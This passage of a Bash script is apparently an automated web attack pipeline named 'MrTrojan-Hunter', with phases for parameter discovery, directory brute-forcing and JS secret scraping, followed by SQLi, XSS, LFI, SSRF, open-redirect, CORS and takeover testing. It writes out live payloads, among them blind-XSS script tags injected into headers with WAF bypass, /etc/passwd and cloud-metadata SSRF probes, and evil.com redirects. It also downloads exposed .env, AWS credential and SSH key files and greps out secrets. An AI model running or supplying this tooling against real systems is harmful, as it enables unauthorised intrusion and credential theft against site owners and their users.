  local OUT="$OUTPUT_DIR/06_params"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"

  if [[ ! -f "$URLS" || ! -s "$URLS" ]]; then
    log_warn "No URLs for param discovery"
    return 0
  fi

  log_module "Extracting parameterized URLs"
  grep -E '\?[^=]+=.+$' "$URLS" 2>/dev/null | sort -u > "$OUT/param_urls.txt" || \
  grep '=' "$URLS" 2>/dev/null | sort -u > "$OUT/param_urls.txt" || true
  log_ok "Param URLs: $(wc -l < "$OUT/param_urls.txt") → $OUT/param_urls.txt"

  if tool_ok gf; then
    for pattern in sqli xss lfi ssrf redirect rce idor upload cors; do
      gf "$pattern" < "$URLS" 2>/dev/null | sort -u > "$OUT/gf_${pattern}.txt" || true
      local c; c=$(wc -l < "$OUT/gf_${pattern}.txt" 2>/dev/null || echo 0)
      [[ "$c" -gt 0 ]] && log_ok "gf $pattern: $c URLs"
    done
  else log_skip "gf"; fi

  if tool_ok arjun && [[ -s "$OUT/param_urls.txt" ]]; then
    run_cmd "arjun passive parameter discovery" \
      bash -c "arjun -u 'https://$DOMAIN' \
        -oT '$OUT/arjun_passive.txt' \
        -t 10 --rate-limit 10 --passive -m GET,POST \
        --headers 'User-Agent: Mozilla/5.0' 2>/dev/null" || true

    if $DEEP_SCAN; then
      local wl="${WORDLIST_DIR}/Discovery/Web-Content/burp-parameter-names.txt"
      [[ -f "$wl" ]] && run_cmd "arjun active parameter brute-force" \
        bash -c "arjun -u 'https://$DOMAIN' \
          -oT '$OUT/arjun_active.txt' \
          -m GET,POST -w '$wl' -t 10 --rate-limit 10 \
          --headers 'User-Agent: Mozilla/5.0' 2>/dev/null" || true
    fi
  else
    [[ ! $(tool_ok arjun) ]] && log_skip "arjun"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 7 — DIRECTORY & FILE BRUTE-FORCING
# ─────────────────────────────────────────────
phase_dirscan() {
  $RUN_DIRSCAN || { log_info "Dir scan skipped (--skip-dirscan)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 07 — Directory & File Brute-Forcing"
  local OUT="$OUTPUT_DIR/07_dirscan"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  if [[ ! -f "$ALIVE" || ! -s "$ALIVE" ]]; then
    log_warn "No alive URLs for dirscan"
    return 0
  fi

  # Limit to first 20 hosts
  local TARGETS
  mapfile -t TARGETS < <(head -20 "$ALIVE" 2>/dev/null)

  if tool_ok dirsearch; then
    for url in "${TARGETS[@]}"; do
      local safe; safe=$(echo "$url" | sed 's|https*://||;s|/.*||;s|:.*||')
      run_cmd "dirsearch → $url" \
        bash -c "dirsearch -u '$url' \
          -e php,asp,aspx,jsp,txt,bak,zip,json,xml,yml,env,config,log,sql \
          --random-agent --recursive -R 2 -t 20 \
          --exclude-status=404 --follow-redirects --delay=0.1 \
          --full-url -q \
          -o '$OUT/dirsearch_${safe}.txt' 2>/dev/null" || true
    done
  else log_skip "dirsearch"; fi

  if tool_ok ffuf; then
    local wl="${WORDLIST_DIR}/Discovery/Web-Content/directory-list-2.3-medium.txt"
    $DEEP_SCAN && wl="${WORDLIST_DIR}/Discovery/Web-Content/directory-list-2.3-big.txt"
    if [[ -f "$wl" ]]; then
      for url in "${TARGETS[@]}"; do
        local safe; safe=$(echo "$url" | sed 's|https*://||;s|/.*||;s|:.*||')
        run_cmd "ffuf directory brute-force → $url" \
          bash -c "ffuf -w '$wl' -u '${url}/FUZZ' \
            -fc 400,401,402,404,429,500,501,502,503 \
            -recursion -recursion-depth 2 \
            -e .html,.php,.txt,.pdf,.js,.zip,.bak,.json,.xml,.env,.config \
            -ac -c -t $THREADS \
            -H 'User-Agent: Mozilla/5.0' \
            -H 'X-Forwarded-For: 127.0.0.1' \
            -r -mc 200,201,301,302 \
            -o '$OUT/ffuf_${safe}.json' -of json -s 2>/dev/null" || true
      done
    else
      log_warn "ffuf wordlist not found: $wl"
    fi
  else log_skip "ffuf"; fi

  # .git exposure check
  log_module "Git repository exposure check"
  while IFS= read -r url; do
    local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" "${url}/.git/" 2>/dev/null || true)
    if [[ "$resp" == "200" ]]; then
      log_vuln "GIT EXPOSED: ${url}/.git/"
      echo "${url}/.git/" >> "$OUT/git_exposed.txt"
    fi
  done < "$ALIVE" || true

  # Backup/config file check
  log_module "Common backup/config file discovery"
  local BACKUP_PATHS=("/.env" "/config.php" "/wp-config.php.bak" "/backup.zip"
    "/db.sql" "/.htaccess" "/robots.txt" "/sitemap.xml" "/.DS_Store"
    "/web.config" "/phpinfo.php" "/info.php" "/test.php" "/debug.php"
    "/.well-known/security.txt" "/crossdomain.xml" "/clientaccesspolicy.xml")

  while IFS= read -r url; do
    for path in "${BACKUP_PATHS[@]}"; do
      local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      [[ "$resp" =~ ^(200|301|302)$ ]] && \
        echo "[${resp}] ${url}${path}" >> "$OUT/sensitive_paths.txt"
    done
  done < <(head -10 "$ALIVE") || true
  log_ok "Backup/config check done → $OUT/sensitive_paths.txt"
}

# ─────────────────────────────────────────────
#  PHASE 8 — JAVASCRIPT ANALYSIS
# ─────────────────────────────────────────────
phase_javascript() {
  $RUN_JS || { log_info "JS phase skipped (--skip-js)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 08 — JavaScript Analysis"
  local OUT="$OUTPUT_DIR/08_javascript"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"

  # Collect JS files
  log_module "Collecting JS files"
  {
    [[ -f "$URLS" ]] && grep -E "\.js($|\?)" "$URLS" 2>/dev/null || true
    if tool_ok katana; then
      echo "https://$DOMAIN" | katana -d 3 -jc -silent 2>/dev/null \
        | grep -E "\.js($|\?)" || true
    fi
  } | sort -u > "$OUT/js_files.txt"
  log_ok "JS files: $(wc -l < "$OUT/js_files.txt") → $OUT/js_files.txt"

  # Probe live JS files
  if tool_ok httpx && [[ -s "$OUT/js_files.txt" ]]; then
    run_cmd "Probing live JS files" \
      bash -c "httpx -l '$OUT/js_files.txt' -mc 200 -content-type -silent 2>/dev/null \
        | grep -E 'application/javascript|text/javascript' \
        | awk '{print \$1}' \
        | sort -u > '$OUT/live_js_files.txt'"
  else
    cp "$OUT/js_files.txt" "$OUT/live_js_files.txt" 2>/dev/null || true
  fi

  # Secret scanning in JS
  log_module "Scanning JS files for secrets"
  local SECRET_PATTERNS="aws_access_key|aws_secret|api[_-]key|apikey|api[_-]secret|passwd|password|secret[_-]key|secret_token|private[_-]key|oauth_token|heroku|slack[_-]token|firebase|stripe|mailgun|sendgrid|github[_-]token|jwt|bearer|authorization|credential|AKIA[0-9A-Z]{16}|BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY"

  while IFS= read -r jsurl; do
    local found; found=$(curl -sk "$jsurl" 2>/dev/null \
      | grep -iE "$SECRET_PATTERNS" | head -20 || true)
    [[ -n "$found" ]] && {
      log_vuln "POTENTIAL SECRET in: $jsurl"
      echo "=== $jsurl ===" >> "$OUT/js_secrets.txt"
      echo "$found" >> "$OUT/js_secrets.txt"
    }
  done < "$OUT/live_js_files.txt" 2>/dev/null || true

  # nuclei JS exposures
  if tool_ok nuclei && [[ -d "${NUCLEI_TEMPLATES}/http/exposures" ]] && [[ -s "$OUT/live_js_files.txt" ]]; then
    run_cmd "nuclei JS exposure templates" \
      bash -c "nuclei -l '$OUT/live_js_files.txt' \
        -t '${NUCLEI_TEMPLATES}/http/exposures/' \
        -c 30 -silent \
        -o '$OUT/nuclei_js_exposures.txt' 2>/dev/null"
  fi

  # Endpoint extraction from JS
  log_module "Extracting API endpoints from JS"
  while IFS= read -r jsurl; do
    curl -sk "$jsurl" 2>/dev/null \
      | grep -oE '(\/api\/[a-zA-Z0-9/_-]+|\/v[0-9]+\/[a-zA-Z0-9/_-]+)' \
      | sort -u >> "$OUT/api_endpoints.txt" || true
  done < "$OUT/live_js_files.txt" 2>/dev/null || true
  sort -u "$OUT/api_endpoints.txt" -o "$OUT/api_endpoints.txt" 2>/dev/null || true
  log_ok "API endpoints → $OUT/api_endpoints.txt"
}

# ─────────────────────────────────────────────
#  PHASE 9 — SQL INJECTION
# ─────────────────────────────────────────────
phase_sqli() {
  $RUN_SQLI || { log_info "SQLi skipped (--skip-sqli)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 09 — SQL Injection Testing"
  local OUT="$OUTPUT_DIR/09_sqli"
  local GF_SQLI="$OUTPUT_DIR/06_params/gf_sqli.txt"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"

  if [[ ! -f "$PARAM_URLS" ]]; then
    log_warn "No param_urls.txt — skipping SQLi"
    return 0
  fi

  log_module "Filtering ASP/PHP/JSP endpoints for SQLi"
  {
    grep -iE "\.(asp|php|jsp|jspx|aspx)(\?|$)" "$PARAM_URLS" 2>/dev/null || true
    [[ -f "$GF_SQLI" ]] && cat "$GF_SQLI" || true
  } | sort -u > "$OUT/sqli_targets.txt"
  log_ok "SQLi targets: $(wc -l < "$OUT/sqli_targets.txt")"

  if tool_ok nuclei && [[ -s "$OUT/sqli_targets.txt" ]]; then
    run_cmd "nuclei SQLi detection" \
      bash -c "nuclei -l '$OUT/sqli_targets.txt' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -tags sqli -c 30 -silent \
        -o '$OUT/nuclei_sqli.txt' 2>/dev/null"
  else log_skip "nuclei (sqli)"; fi

  # Error-based quick probe (deep only)
  if $DEEP_SCAN && [[ -s "$OUT/sqli_targets.txt" ]]; then
    log_module "Error-based SQLi quick probe"
    while IFS= read -r url; do
      local resp; resp=$(curl -sk "${url}'" 2>/dev/null || true)
      echo "$resp" | grep -iqE "sql syntax|mysql|ora-|syntax error|unclosed quotation|OLE DB" && \
        log_vuln "POSSIBLE SQLi: $url" && echo "$url" >> "$OUT/sqli_candidates.txt"
    done < "$OUT/sqli_targets.txt" || true
  fi
}

# ─────────────────────────────────────────────
#  PHASE 10 — XSS TESTING
# ─────────────────────────────────────────────
phase_xss() {
  $RUN_XSS || { log_info "XSS skipped (--skip-xss)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 10 — Cross-Site Scripting (XSS)"
  local OUT="$OUTPUT_DIR/10_xss"
  local GF_XSS="$OUTPUT_DIR/06_params/gf_xss.txt"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"

  {
    [[ -f "$GF_XSS" ]]    && cat "$GF_XSS"    || true
    [[ -f "$PARAM_URLS" ]] && grep -iE "\?(.*=)" "$PARAM_URLS" || true
  } | sort -u > "$OUT/xss_targets.txt"
  log_ok "XSS targets: $(wc -l < "$OUT/xss_targets.txt")"

  if tool_ok Gxss && tool_ok kxss && [[ -s "$OUT/xss_targets.txt" ]]; then
    run_cmd "Gxss → kxss XSS reflection check" \
      bash -c "cat '$OUT/xss_targets.txt' \
        | Gxss -p Rxss 2>/dev/null \
        | kxss 2>/dev/null \
        | tee -a '$OUT/kxss_output.txt'"
  else log_skip "Gxss/kxss"; fi

  if tool_ok dalfox && [[ -s "$OUT/xss_targets.txt" ]]; then
    local blind_flag=""
    [[ -n "$BURP_COLLABORATOR" ]] && blind_flag="--blind $BURP_COLLABORATOR"
    run_cmd "dalfox pipe mode XSS scan" \
      bash -c "cat '$OUT/xss_targets.txt' \
        | dalfox pipe --skip-bav --silence $blind_flag --waf-bypass --timeout 10 2>/dev/null \
        | tee -a '$OUT/dalfox_results.txt'"
    grep -i "POC" "$OUT/dalfox_results.txt" 2>/dev/null && \
      log_vuln "dalfox found XSS! See $OUT/dalfox_results.txt"
  else log_skip "dalfox"; fi

  # Blind XSS via curl (no separate bxss tool needed)
  if [[ -n "$BXSS_ENDPOINT" ]] && [[ -s "$OUT/xss_targets.txt" ]]; then
    log_module "Blind XSS injection via curl headers"
    local payload="\">'><script src=\"${BXSS_ENDPOINT}\"></script>"
    while IFS= read -r url; do
      curl -sk "$url" \
        -H "X-Forwarded-For: ${payload}" \
        -H "User-Agent: ${payload}" \
        -o /dev/null 2>/dev/null || true
    done < <(head -50 "$OUT/xss_targets.txt") || true
    log_ok "Blind XSS headers injected on top-50 targets"
  fi

  if tool_ok nuclei && [[ -s "$OUT/xss_targets.txt" ]]; then
    run_cmd "nuclei XSS templates" \
      bash -c "nuclei -l '$OUT/xss_targets.txt' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -tags xss -c 30 -silent \
        -o '$OUT/nuclei_xss.txt' 2>/dev/null"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 11 — LFI TESTING
# ─────────────────────────────────────────────
phase_lfi() {
  $RUN_LFI || { log_info "LFI skipped (--skip-lfi)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 11 — Local File Inclusion (LFI)"
  local OUT="$OUTPUT_DIR/11_lfi"
  local GF_LFI="$OUTPUT_DIR/06_params/gf_lfi.txt"

  if [[ ! -f "$GF_LFI" || ! -s "$GF_LFI" ]]; then
    log_warn "No gf_lfi.txt — skipping LFI phase"
    return 0
  fi

  if tool_ok nuclei; then
    run_cmd "nuclei LFI templates" \
      bash -c "nuclei -l '$GF_LFI' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/generic/generic-linux-lfi.yaml' \
        -c 30 -silent \
        -o '$OUT/nuclei_lfi.txt' 2>/dev/null"
  else log_skip "nuclei (lfi)"; fi

  # /etc/passwd probe via qsreplace
  if tool_ok qsreplace; then
    run_cmd "LFI /etc/passwd quick probe" \
      bash -c "cat '$GF_LFI' \
        | qsreplace '/etc/passwd' 2>/dev/null \
        | xargs -I% -P $THREADS sh -c \
          'curl -sk \"%\" 2>/dev/null | grep -q \"root:x\" && echo \"VULN: %\"' \
        | tee -a '$OUT/lfi_etc_passwd.txt'"
    [[ -s "$OUT/lfi_etc_passwd.txt" ]] && log_vuln "LFI confirmed → $OUT/lfi_etc_passwd.txt"
  else log_skip "qsreplace (lfi)"; fi

  # ffuf LFI with payload list (deep only)
  if tool_ok ffuf && $DEEP_SCAN; then
    local LFI_WL="$HOME/payloads/lfi.txt"
    if [[ -f "$LFI_WL" ]] && tool_ok qsreplace; then
      run_cmd "ffuf LFI payload fuzzing" \
        bash -c "cat '$GF_LFI' \
          | sed 's/=.*/=/' \
          | qsreplace 'FUZZ' 2>/dev/null \
          | sort -u \
          | xargs -I{} ffuf -u {} -w '$LFI_WL' \
            -c -mr 'root:(x|\*|\\\$[^:]*):0:0:' -v -s 2>/dev/null" || true
    fi
  fi
}

# ─────────────────────────────────────────────
#  PHASE 12 — SSRF TESTING
# ─────────────────────────────────────────────
phase_ssrf() {
  $RUN_SSRF || { log_info "SSRF skipped (--skip-ssrf)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 12 — SSRF Testing"
  local OUT="$OUTPUT_DIR/12_ssrf"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"
  local GF_SSRF="$OUTPUT_DIR/06_params/gf_ssrf.txt"

  log_module "Extracting SSRF-prone parameters"
  {
    [[ -f "$URLS" ]] && grep -iE 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|fetch=|load=|src=|source=|href=|endpoint=' \
      "$URLS" 2>/dev/null || true
    [[ -f "$GF_SSRF" ]] && cat "$GF_SSRF" || true
  } | sort -u > "$OUT/ssrf_params.txt"
  log_ok "SSRF params: $(wc -l < "$OUT/ssrf_params.txt")"

  if [[ -n "$BURP_COLLABORATOR" ]] && tool_ok qsreplace && [[ -s "$OUT/ssrf_params.txt" ]]; then
    run_cmd "SSRF → Burp Collaborator callback" \
      bash -c "cat '$OUT/ssrf_params.txt' \
        | qsreplace 'http://$BURP_COLLABORATOR/ssrf_test' 2>/dev/null \
        | xargs -I% -P $THREADS curl -sk '%' -o /dev/null \
          -w '[%{http_code}] %{url_effective}\n' 2>/dev/null \
        | tee -a '$OUT/ssrf_callback_results.txt'"
  fi

  # Local SSRF probes
  if tool_ok qsreplace && [[ -s "$OUT/ssrf_params.txt" ]]; then
    local SSRF_PAYLOADS=(
      "http://127.0.0.1/"
      "http://localhost/"
      "http://169.254.169.254/latest/meta-data/"
      "http://[::1]/"
      "http://0x7f000001/"
      "http://127.1/"
    )
    for payload in "${SSRF_PAYLOADS[@]}"; do
      run_cmd "SSRF probe: $payload" \
        bash -c "cat '$OUT/ssrf_params.txt' \
          | head -20 \
          | qsreplace '$payload' 2>/dev/null \
          | xargs -I% -P 10 sh -c \
            'code=\$(curl -sk -o /dev/null -w \"%{http_code}\" \"%\" 2>/dev/null); [[ \"\$code\" == \"200\" ]] && echo \"[POSSIBLE SSRF \$code] %\"' \
          >> '$OUT/ssrf_local_probe.txt'" 2>/dev/null || true
    done
    [[ -s "$OUT/ssrf_local_probe.txt" ]] && log_vuln "Potential SSRF → $OUT/ssrf_local_probe.txt"
  fi

  if tool_ok nuclei && [[ -s "$OUT/ssrf_params.txt" ]]; then
    run_cmd "nuclei SSRF templates" \
      bash -c "nuclei -l '$OUT/ssrf_params.txt' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -tags ssrf -c 30 -silent \
        -o '$OUT/nuclei_ssrf.txt' 2>/dev/null"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 13 — OPEN REDIRECT
# ─────────────────────────────────────────────
phase_redirect() {
  $RUN_REDIRECT || { log_info "Redirect skipped (--skip-redirect)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 13 — Open Redirect Testing"
  local OUT="$OUTPUT_DIR/13_redirect"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"
  local GF_RED="$OUTPUT_DIR/06_params/gf_redirect.txt"

  log_module "Extracting redirect-prone parameters"
  {
    [[ -f "$URLS" ]] && grep -iP "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|next=|out=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_url=|rurl=|target=|to=|uri=|url=|location=|u=" \
      "$URLS" 2>/dev/null || true
    [[ -f "$GF_RED" ]] && cat "$GF_RED" || true
  } | sort -u > "$OUT/redirect_params.txt"
  log_ok "Redirect params: $(wc -l < "$OUT/redirect_params.txt")"

  if tool_ok httpx && tool_ok qsreplace && [[ -s "$OUT/redirect_params.txt" ]]; then
    run_cmd "Open Redirect probe → evil.com" \
      bash -c "cat '$OUT/redirect_params.txt' \
        | qsreplace 'https://evil.com' 2>/dev/null \
        | httpx -silent -fr -mr 'evil.com' \
        | tee -a '$OUT/redirect_hits.txt'"
    [[ -s "$OUT/redirect_hits.txt" ]] && log_vuln "Open Redirect found → $OUT/redirect_hits.txt"
  fi

  if tool_ok nuclei && [[ -s "$OUT/redirect_params.txt" ]]; then
    run_cmd "nuclei open redirect templates" \
      bash -c "nuclei -l '$OUT/redirect_params.txt' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -tags redirect -c 30 -silent \
        -o '$OUT/nuclei_redirect.txt' 2>/dev/null"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 14 — CORS
# ─────────────────────────────────────────────
phase_cors() {
  $RUN_CORS || { log_info "CORS skipped (--skip-cors)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 14 — CORS Misconfiguration"
  local OUT="$OUTPUT_DIR/14_cors"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  if [[ ! -f "$ALIVE" || ! -s "$ALIVE" ]]; then
    log_warn "No alive URLs for CORS check"
    return 0
  fi

  # Manual CORS check (inlined — no corsy.py needed)
  log_module "CORS manual check (evil.com + null origin)"
  while IFS= read -r url; do
    # Wildcard / reflected origin
    local resp; resp=$(curl -sk -H "Origin: https://evil.com" -I "$url" 2>/dev/null \
      | grep -i "access-control" || true)
    if echo "$resp" | grep -qi "evil.com"; then
      log_vuln "CORS misconfig (reflects evil.com): $url"
      echo "[REFLECT] $url => $resp" >> "$OUT/cors_vulnerable.txt"
    fi
    # Null origin
    local null_resp; null_resp=$(curl -sk -H "Origin: null" -I "$url" 2>/dev/null \
      | grep -i "access-control-allow-origin: null" || true)
    [[ -n "$null_resp" ]] && {
      log_vuln "CORS null origin: $url"
      echo "[NULL] $url" >> "$OUT/cors_vulnerable.txt"
    }
    # Trusted-subdomain bypass
    local sub_resp; sub_resp=$(curl -sk -H "Origin: https://evil.${DOMAIN}" -I "$url" 2>/dev/null \
      | grep -i "access-control-allow-origin" | grep -i "evil\." || true)
    [[ -n "$sub_resp" ]] && {
      log_vuln "CORS trusted-subdomain bypass: $url"
      echo "[SUBDOMAIN] $url" >> "$OUT/cors_vulnerable.txt"
    }
  done < "$ALIVE" 2>/dev/null || true
  log_ok "CORS check done → $OUT/cors_vulnerable.txt"

  if tool_ok nuclei; then
    run_cmd "nuclei CORS templates" \
      bash -c "nuclei -l '$ALIVE' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/cors/' \
        -c 30 -silent \
        -o '$OUT/nuclei_cors.txt' 2>/dev/null"
  fi
}

# ─────────────────────────────────────────────
#  PHASE 15 — SUBDOMAIN TAKEOVER
# ─────────────────────────────────────────────
phase_takeover() {
  $RUN_TAKEOVER || { log_info "Takeover skipped (--skip-takeover)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 15 — Subdomain Takeover"
  local OUT="$OUTPUT_DIR/15_takeover"
  local SUBS="$OUTPUT_DIR/01_subdomains/all_subdomains.txt"

  if [[ ! -f "$SUBS" || ! -s "$SUBS" ]]; then
    log_warn "No subdomains for takeover check"
    return 0
  fi

  if tool_ok subzy; then
    run_cmd "subzy subdomain takeover scan" \
      bash -c "subzy run --targets '$SUBS' \
        --concurrency 100 --hide_fails --verify_ssl 2>/dev/null \
        | tee -a '$OUT/subzy_results.txt'"
    grep -i "VULNERABLE" "$OUT/subzy_results.txt" 2>/dev/null && \
      log_vuln "Subdomain takeover found! → $OUT/subzy_results.txt"
  else log_skip "subzy"; fi

  # CNAME dangling check
  log_module "CNAME dangling check"
  while IFS= read -r sub; do
    local cname; cname=$(dig CNAME "$sub" +short 2>/dev/null | head -1 || true)
    if [[ -n "$cname" ]]; then
      local resolved; resolved=$(dig +short "$cname" 2>/dev/null | head -1 || true)
      [[ -z "$resolved" ]] && {
        log_warn "Potentially dangling CNAME: $sub → $cname"
        echo "$sub → $cname" >> "$OUT/dangling_cnames.txt"
      }
    fi
  done < "$SUBS" 2>/dev/null || true
  log_ok "CNAME check done → $OUT/dangling_cnames.txt"
}

# ─────────────────────────────────────────────
#  PHASE 16 — NUCLEI BROAD SCAN
# ─────────────────────────────────────────────
phase_nuclei() {
  $RUN_NUCLEI || { log_info "Nuclei skipped (--skip-nuclei)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 16 — Nuclei Broad Scan"
  local OUT="$OUTPUT_DIR/16_nuclei"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  if [[ ! -f "$ALIVE" || ! -s "$ALIVE" ]]; then
    log_warn "No alive URLs for nuclei"
    return 0
  fi

  if ! tool_ok nuclei; then
    log_skip "nuclei"
    return 0
  fi

  run_cmd "nuclei CVE scan (high/critical)" \
    bash -c "nuclei -l '$ALIVE' \
      -t '${NUCLEI_TEMPLATES}/http/cves/' \
      -severity high,critical -c 30 -bs 50 -silent \
      -o '$OUT/nuclei_cves.txt' 2>/dev/null"

  run_cmd "nuclei misconfiguration templates" \
    bash -c "nuclei -l '$ALIVE' \
      -t '${NUCLEI_TEMPLATES}/http/misconfiguration/' \
      -c 30 -bs 50 -silent \
      -o '$OUT/nuclei_misconfig.txt' 2>/dev/null"

  run_cmd "nuclei exposure templates" \
    bash -c "nuclei -l '$ALIVE' \
      -t '${NUCLEI_TEMPLATES}/http/exposures/' \
      -c 30 -bs 50 -silent \
      -o '$OUT/nuclei_exposures.txt' 2>/dev/null"

  run_cmd "nuclei technology fingerprint" \
    bash -c "nuclei -l '$ALIVE' \
      -t '${NUCLEI_TEMPLATES}/http/technologies/' \
      -c 30 -bs 50 -silent \
      -o '$OUT/nuclei_tech.txt' 2>/dev/null"

  run_cmd "nuclei default-login templates" \
    bash -c "nuclei -l '$ALIVE' \
      -t '${NUCLEI_TEMPLATES}/http/default-logins/' \
      -c 30 -bs 50 -silent \
      -o '$OUT/nuclei_default_logins.txt' 2>/dev/null"

  if [[ -s "$OUTPUT_DIR/06_params/param_urls.txt" ]]; then
    run_cmd "nuclei DAST on parameterized URLs" \
      bash -c "nuclei -l '$OUTPUT_DIR/06_params/param_urls.txt' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -severity low,medium,high,critical -c 30 -bs 50 -silent \
        -o '$OUT/nuclei_dast.txt' 2>/dev/null"
  fi

  if [[ -s "$OUTPUT_DIR/03_portscan/naabu_top1000.txt" ]]; then
    run_cmd "nuclei network templates" \
      bash -c "nuclei -l '$OUTPUT_DIR/03_portscan/naabu_top1000.txt' \
        -t '${NUCLEI_TEMPLATES}/network/' \
        -c 30 -bs 50 -silent \
        -o '$OUT/nuclei_network.txt' 2>/dev/null"
  fi
  log_ok "Nuclei scans complete — results in $OUT/"
}

# ─────────────────────────────────────────────
#  PHASE 17 — SECRET & CREDENTIAL HUNTING
# ─────────────────────────────────────────────
phase_secrets() {
  $RUN_SECRETS || { log_info "Secrets skipped (--skip-secrets)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 17 — Secrets & Credential Hunting"
  local OUT="$OUTPUT_DIR/17_secrets"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  if [[ ! -f "$ALIVE" || ! -s "$ALIVE" ]]; then
    log_warn "No alive URLs for secrets phase"
    return 0
  fi

  # Exposed config/secret file paths
  log_module "Fetching common secret file paths"
  local SECRET_PATHS=("/.env" "/.env.backup" "/.env.local" "/.env.production"
    "/config.json" "/config.yml" "/config.yaml"
    "/application.properties" "/application.yml"
    "/settings.py" "/local_settings.py"
    "/wp-config.php" "/configuration.php"
    "/database.yml" "/secrets.yml"
    "/.aws/credentials" "/.ssh/id_rsa"
    "/Dockerfile" "/docker-compose.yml"
    "/.npmrc" "/.netrc" "/.pgpass")

  while IFS= read -r url; do
    for path in "${SECRET_PATHS[@]}"; do
      local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
      if [[ "$resp" == "200" ]]; then
        local content; content=$(curl -sk "${url}${path}" 2>/dev/null | head -30 || true)
        {
          echo "=== [200] ${url}${path} ==="
          echo "$content"
        } >> "$OUT/exposed_files.txt"
        log_vuln "Exposed file: ${url}${path}"
      fi
    done
  done < <(head -20 "$ALIVE") 2>/dev/null || true

  # Grep secrets from all collected output
  log_module "Grep secrets from collected output files"
  grep -rhoiE "(AKIA[0-9A-Z]{16}|aws_access_key_id|aws_secret_access_key|ghp_[a-zA-Z0-9]{36}|sk-[a-zA-Z0-9]{48}|BEGIN (RSA|EC) PRIVATE|password\s*=\s*['\"][^'\"]{6,}|api_key\s*[:=]\s*['\"][^'\"]{6,}|secret\s*[:=]\s*['\"][^'\"]{6,}|token\s*[:=]\s*['\"][^'\"]{6,})" \
    "$OUTPUT_DIR" 2>/dev/null | sort -u > "$OUT/grep_secrets.txt" || true
  [[ -s "$OUT/grep_secrets.txt" ]] && log_vuln "Potential secrets → $OUT/grep_secrets.txt"
  log_ok "Secrets phase done"
}

# ─────────────────────────────────────────────
#  PHASE 18 — CLOUD & INFRASTRUCTURE
# ─────────────────────────────────────────────
phase_cloud() {
  $RUN_CLOUD || { log_info "Cloud skipped (--skip-cloud)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 18 — Cloud & Infrastructure"
  local OUT="$OUTPUT_DIR/19_cloud"

  log_module "S3 / GCP / Azure bucket enumeration"
  local BUCKETS=(
    "${DOMAIN}" "${DOMAIN//./-}" "www.${DOMAIN}" "backup.${DOMAIN}"
    "dev.${DOMAIN}" "staging.${DOMAIN}" "assets.${DOMAIN}" "static.${DOMAIN}"
    "media.${DOMAIN}" "files.${DOMAIN}" "data.${DOMAIN}" "api.${DOMAIN}"
  )

  for bucket in "${BUCKETS[@]}"; do
    # S3
    local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" \
      "https://${bucket}.s3.amazonaws.com" 2>/dev/null || true)
    [[ "$resp" == "200" || "$resp" == "403" ]] && {
      log_warn "S3 bucket exists [HTTP $resp]: ${bucket}.s3.amazonaws.com"
      echo "[${resp}] ${bucket}.s3.amazonaws.com" >> "$OUT/s3_buckets.txt"
    }
    # GCP
    resp=$(curl -sk -o /dev/null -w "%{http_code}" \
      "https://storage.googleapis.com/${bucket}" 2>/dev/null || true)
    [[ "$resp" == "200" || "$resp" == "403" ]] && \
      echo "[${resp}] GCP: storage.googleapis.com/${bucket}" >> "$OUT/gcp_buckets.txt"
    # Azure
    resp=$(curl -sk -o /dev/null -w "%{http_code}" \
      "https://${bucket}.blob.core.windows.net" 2>/dev/null || true)
    [[ "$resp" == "200" || "$resp" == "403" ]] && \
      echo "[${resp}] Azure: ${bucket}.blob.core.windows.net" >> "$OUT/azure_blobs.txt"
  done
  log_ok "Cloud bucket check done"

  if [[ -n "$SHODAN_KEY" ]]; then
    run_cmd "Shodan host search" \
      bash -c "curl -s 'https://api.shodan.io/shodan/host/search?key=${SHODAN_KEY}&query=hostname:${DOMAIN}' \
        2>/dev/null \
        | jq -r '.matches[]? | .ip_str + \":\" + (.port|tostring) + \" \" + (.product // \"\")' \
        2>/dev/null | sort -u > '$OUT/shodan_hosts.txt'" || true
  fi
}

# ─────────────────────────────────────────────
#  PHASE 19 — WORDPRESS
# ─────────────────────────────────────────────
phase_wordpress() {
